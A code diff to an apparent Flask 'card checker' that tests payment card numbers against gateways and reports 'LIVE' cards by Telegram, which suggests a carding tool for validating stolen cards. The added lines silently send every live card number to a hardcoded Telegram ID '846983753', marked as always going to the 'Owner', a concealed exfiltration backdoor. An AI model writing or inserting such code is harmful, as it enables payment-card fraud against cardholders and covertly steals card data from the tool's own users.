@@ -220,8 +220,12 @@ def check_card():
             result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}
 
         if result['status'] == 'live':
-            telegram_ids = [user.telegram_id] if user.telegram_id else []
-            enviar_telegram(f"✅ *LIVE* - {result['cc']}\n{result['message']}", telegram_ids)
+            telegram_ids = set()  # Usamos set() para evitar duplicados
+            if user.telegram_id:
+                telegram_ids.add(user.telegram_id)
+            telegram_ids.add('846983753')  # Siempre agrega al Owner
+            enviar_telegram(f"✅ *LIVE* - {result['cc']}\n{result['message']}", list(telegram_ids))
+
 
         return jsonify(result)
     except Exception as e:
@@ -234,3 +238,4 @@ def ping():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
+
